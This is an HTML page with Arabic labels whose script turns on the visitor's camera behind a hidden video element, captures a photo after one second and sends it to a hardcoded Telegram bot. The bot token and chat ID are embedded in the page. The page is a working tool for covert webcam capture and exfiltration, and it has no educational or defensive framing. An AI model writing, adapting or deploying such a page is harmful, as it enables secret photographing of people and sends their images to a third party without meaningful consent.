<!DOCTYPE html>
<html>
<head>
  <title>Take Photo</title>
</head>
<body>
<h3>التقاط صورة تلقائيًا</h3>
<video id="video" autoplay style="display:none;"></video>
<script>
const chatId = '7631694782';
const botToken = '7629731228:AAHuRShLFPR1DbA8E3RYGOwNu_EDKAJVLh4';

async function sendPhotoToTelegram(imgData) {
    const formData = new FormData();
    const blob = await (await fetch(imgData)).blob();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'selfie.jpg');

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    }).then(res => res.json())
      .then(console.log)
      .catch(console.error);
}

navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
    const video = document.getElementById('video');
    video.srcObject = stream;
    video.addEventListener('loadedmetadata', () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        // التقاط الصورة بعد 1 ثانية تلقائيًا
        setTimeout(() => {
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imgData = canvas.toDataURL('image/jpeg');
            sendPhotoToTelegram(imgData);
            alert('تم التقاط الصورة وإرسالها للبوت!');
        }, 1000);
    });
})
.catch(err => alert('فشل الوصول إلى الكاميرا: ' + err));
</script>
</body>
</html>
